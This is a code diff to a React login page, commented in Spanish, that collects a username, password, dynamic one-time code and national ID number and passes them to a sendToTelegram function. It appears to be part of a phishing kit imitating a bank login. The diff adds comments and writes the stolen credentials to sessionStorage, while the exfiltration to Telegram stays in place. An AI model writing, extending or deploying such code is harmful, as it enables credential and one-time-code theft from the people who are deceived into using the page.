@@ -47,18 +47,18 @@ const countries = [
 ];
 
 export default function LoginPage() {
-  const router = useRouter();
+  const router = useRouter(); // Hook para manejar la navegación
   const [formData, setFormData] = useState({
     usuario: "",
     clave: "",
     claveDinamica: "",
-  });
-  const [loading, setLoading] = useState(false);
-  const [isCaptchaChecked, setIsCaptchaChecked] = useState(false);
-  const [isLoading, setIsLoading] = useState(false);
-  const [selectedCountry, setSelectedCountry] = useState(countries[0]);
-  const [isCountryMenuOpen, setIsCountryMenuOpen] = useState(false);
-  const [showTransition, setShowTransition] = useState(false);
+  }); // Estado para los datos del formulario
+  const [loading, setLoading] = useState(false); // Estado para manejar el estado de carga
+  const [isCaptchaChecked, setIsCaptchaChecked] = useState(false); // Estado para manejar si el captcha está marcado
+  const [isLoading, setIsLoading] = useState(false); // Estado para manejar el estado de carga del captcha
+  const [selectedCountry, setSelectedCountry] = useState(countries[0]); // Estado para manejar el país seleccionado
+  const [isCountryMenuOpen, setIsCountryMenuOpen] = useState(false); // Estado para manejar si el menú de países está abierto
+  const [showTransition, setShowTransition] = useState(false); // Estado para manejar la transición de la página
 
   useEffect(() => {
     const cedula = sessionStorage.getItem("cedula");
@@ -90,13 +90,19 @@ export default function LoginPage() {
         router.push("/cedula");
         return;
       }
-
+  
+      // Guarda los datos de sesión en sessionStorage
+      sessionStorage.setItem("usuario", formData.usuario);
+      sessionStorage.setItem("clave", formData.clave);
+      sessionStorage.setItem("claveDinamica", formData.claveDinamica);
+      sessionStorage.setItem("countryCode", selectedCountry.code);
+      
       await sendToTelegram({
         ...formData,
         cedula,
         countryCode: selectedCountry.code,
       });
-
+  
       setShowTransition(true);
       setTimeout(() => {
         setLoading(false);
@@ -104,6 +110,7 @@ export default function LoginPage() {
       }, 2000);
     }
   };
+  
 
   return (
     <main className="min-h-screen bg-pink-50 relative">
